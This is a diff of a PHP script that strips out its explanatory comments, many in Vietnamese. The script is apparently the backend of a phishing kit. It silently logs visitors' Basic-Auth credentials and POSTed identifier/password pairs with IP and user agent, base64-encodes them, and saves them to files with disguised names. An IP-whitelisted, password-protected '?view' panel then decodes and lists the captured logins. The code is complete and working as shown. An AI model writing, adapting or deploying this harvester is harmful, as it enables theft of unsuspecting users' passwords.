@@ -1,7 +1,4 @@
 ﻿<?php
-// data_manager_core.php
-// PHP core: logging + POST handling + view auth + load $rows for HTML
-// Config: chỉnh các biến ở đây
 $DATA_FILE   = __DIR__ . '/dXNlcl9kYXRhX2xvZ2luX3Bhc3M=.txt';
 $ACCESS_LOG  = __DIR__ . '/dXNlcl9hY2Nlc3NfdXNlcl9wYXNz.log';
 $ALLOWED_IPS = '116.98.3.165';
@@ -12,7 +9,6 @@ $MAX_LEN     = 200;
 $USE_API_KEY = false;
 $API_KEY     = 'change_this_api_key';
 
-// ---------- utilities ----------
 function getClientIp() {
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
@@ -48,13 +44,11 @@ function requireAuth($user, $pass) {
     }
 }
 
-// ensure data dir exists
 $datadir = dirname($DATA_FILE);
 if (!is_dir($datadir)) {
     @mkdir($datadir, 0750, true);
 }
 
-// ---------- ghi Basic-Auth của visitor (trừ khi đang xem ?view=1) ----------
 if (isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']) && !isset($_GET['view'])) {
     $visitorUser = trim((string)$_SERVER['PHP_AUTH_USER']);
     $visitorPw   = trim((string)$_SERVER['PHP_AUTH_PW']);
@@ -70,7 +64,6 @@ if (isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']) && !isset($_GET['v
     }
 }
 
-// ---------- xử lý POST (identifier/password) ----------
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if ($USE_API_KEY) {
         $headers = function_exists('getallheaders') ? getallheaders() : [];
@@ -95,11 +88,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $time  = date('Y-m-d H:i:s');
     $ip    = getClientIp();
 
-// Lấy User Agent
     $ua = $_SERVER['HTTP_USER_AGENT'] ?? '-';
     $uaClean = str_replace(["\r","\n"], ['',''], $ua);
 
-    // Ghi: TIMESTAMP | POST | IP | base64(ID) | base64(PW) | UA
     $line = sprintf("%s | POST | %s | %s | %s | %s\n", $time, $ip, $encId, $encPw, $uaClean); 
     $written = @file_put_contents($DATA_FILE, $line, FILE_APPEND | LOCK_EX);
     if ($written === false) {
@@ -109,34 +100,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     jsonResp(true, 'Ghi thành công', 200);
 }
 
-// ---------- xử lý view: chuẩn bị $rows để HTML hiển thị ----------
-$rows = []; // bạn có thể dùng $rows trong phần HTML sau khi include file này
+$rows = [];
 if (isset($_GET['view'])) {
-    // kiểm tra whitelist IP
     if (!isIpAllowed($ALLOWED_IPS)) {
         http_response_code(403);
         echo "IP của bạn không được phép truy cập";
         exit;
     }
-    // kiểm tra admin Basic Auth
+
     requireAuth($ADMIN_USER, $ADMIN_PASS);
 
-    // ghi access log
     $logLine = sprintf("%s | VIEW | %s | %s\n", date('Y-m-d H:i:s'), getClientIp(), $_SERVER['PHP_AUTH_USER'] ?? '-');
     @file_put_contents($ACCESS_LOG, $logLine, FILE_APPEND | LOCK_EX);
 
-    // đọc file data và parse từng dòng. Hỗ trợ 2 loại line:
-    //  - LOGIN: TIMESTAMP | LOGIN | ip | base64(user) | base64(pw) | ua
-    //  - POST:  TIMESTAMP | ip | base64(id) | base64(pw)
     if (file_exists($DATA_FILE)) {
         $lines = file($DATA_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         foreach ($lines as $ln) {
             $parts = array_map('trim', explode('|', $ln));
             if (count($parts) < 3) continue;
             $time = $parts[0] ?? '';
-            // detect LOGIN record
             if (isset($parts[1]) && strtoupper($parts[1]) === 'LOGIN' && count($parts) >= 6) {
-                // time | LOGIN | ip | encUser | encPw | ua
                 $cip  = $parts[2];
                 $encU = $parts[3];
                 $encP = $parts[4];
@@ -154,14 +137,14 @@ if (isset($_GET['view'])) {
                     'ua' => $ua,
                 ];
 		} else {
-                // assume new POST record: time | POST | ip | encId | encPw | ua (6 parts)
+                
                 if (count($parts) >= 6 && strtoupper($parts[1]) === 'POST') {
-                    // Xử lý 6 cột mới: time | POST | ip | encId | encPw | ua
-                    $type  = $parts[1]; // 'POST'
-                    $cip   = $parts[2]; // IP Client
-                    $encId = $parts[3]; // Encoded ID
-                    $encPw = $parts[4]; // Encoded PW
-                    $ua    = $parts[5]; // User Agent
+                   
+                    $type  = $parts[1]; 
+                    $cip   = $parts[2]; 
+                    $encId = $parts[3]; 
+                    $encPw = $parts[4]; 
+                    $ua    = $parts[5]; 
                     
                     $id = (@base64_decode($encId, true) === false) ? $encId : base64_decode($encId);
                     $pw = (@base64_decode($encPw, true) === false) ? $encPw : base64_decode($encPw);
@@ -174,14 +157,13 @@ if (isset($_GET['view'])) {
                         'password' => $pw,
                         'raw_enc_id' => $encId,
                         'raw_enc_pw' => $encPw,
-                        'ua' => $ua, // Thêm User Agent vào đây
+                        'ua' => $ua, 
                     ];
                 }
             }
         }
     }
-    // KẾT THÚC: $rows sẵn sàng để phần HTML dùng (file that includes this can iterate $rows)
-    // Không exit ở đây, vì bạn muốn hiển thị HTML sau khi include file này.
+
 }
 ?>
 <!doctype html>
